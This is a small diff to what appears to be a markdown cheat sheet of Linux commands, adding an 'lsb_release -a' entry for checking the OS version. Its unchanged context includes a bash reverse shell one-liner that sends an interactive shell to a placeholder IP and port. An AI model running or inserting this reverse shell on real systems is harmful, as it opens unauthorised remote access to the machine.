@@ -253,3 +253,7 @@ dpkg --print-architecture
 ```bash
 /bin/bash -i > /dev/tcp/IP/PORT 0<&1 2>&1
 ```
+* Check OS version
+```bash
+lsb_release -a
+```
